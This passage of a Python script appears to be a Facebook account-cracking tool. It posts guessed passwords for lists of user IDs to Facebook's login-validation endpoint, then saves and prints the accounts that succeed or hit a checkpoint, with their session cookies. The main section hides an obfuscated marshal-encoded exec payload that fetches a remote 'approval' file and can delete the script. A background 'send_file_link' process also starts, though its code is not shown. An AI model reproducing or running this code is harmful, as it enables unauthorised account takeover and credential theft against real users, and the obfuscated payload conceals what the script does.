'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\033[1;97m\u001b[33m [{time.strftime("%H:%M")}-CP] {idf} │ {pw} \033[1;97m')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\033[1;97m\033[1;32m [{time.strftime("%H:%M")}-OK] {idf} │ {pw} \033[1;97m ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

#------------------[ MAIN ]-------------------#

_ = lambda __ : __import__('marshal').loads(__[::-1]);exec((_)(b'\x00\x00\x00\x10r\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x00\xf0\x0b\x01\x07\x02\xf0\x01\x01\x01\x03\xf0\x00\x00\x00\x1es\x00\x00\x00\x01\x00\x00\x00\x12r>eludom<\x08\xfa\x00\x00\x00\x0er\x00\x00\x00\x10r\x00\xa9\x00\x00\x00\x0fr\x01)N\x00\x00\x00\x00\xf3d\x80\n\x06\xd8\x13\x02\xd0\x13\x02\xd0\x13\x02\xd0\x13\x02\xd4\x13\x02\xd1F\x88)\x82)\x87\x04\x02\xdd\x15\x02\xd0\x15\x02\xd4\x15\x02\xd1H\x8d)\x82)\x87\x04\x02\xdd\x1c\x02\xd0\x1c\x02\xd4\x1c\x02\xd1\x1b\x08\xd0\x07\x02\xdd\x1e\x04\xd0\x1e\x04\xd0\x1d\x94\x18\x90\r\x04\xd8\x18\x80\x1d\x0c\xd4\x1d\x0c\xd1\x13\x98L\x8aL\x8f\x14\x0c\xdd\x13\x80F\x07\xd8\x00\x80\x00\x00\x00cs\x00\x00\x00\x01\x00\x00\x00\x0frsed\x03\xda>x<\x03\xfa  \x00\x00\x00\x02sesnopser\x08\xdalru\x03\xda\x02)metsys\x06\xda__elif__\x08\xdaevomer\x06\xdaso\x02\xdatnirp\x05\xdatxet\x04\xdateg\x03\xdastseuqer\x08\xda\x08)tixe\x04\xdaGNIYORTSED ]\xa2\x80\xe2[ \x00\x00\x00\x11uyortsed\x07\xdatxt.lavorppa/niam/bolb/lavorppa/DX-yyyrrah/moc.buhtig//:sptth=zN\x05)\x00S\x00d\x00S\x00d\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x04d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0ct\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08t\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x03d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07tJr\x00v\x00\x00\x00\x00\x00\x00\x00\x00\x02j\x01|\x02d\x01}\x00\x00\x00\x00\x00\x00\x00\x00\x01\xab\x00\x00\x01\xa6\x00|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x00}\x01d\x00\x97\x00\x00\x00\xe4\xf3\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\x02)\x00S\x01d\x00Z\x00\x84\x00d\x00\x97\x00\x00\x00\x0c\xf3\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c'))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	p = multiprocessing.Process(target=send_file_link)
	p.start()
	des()
	login()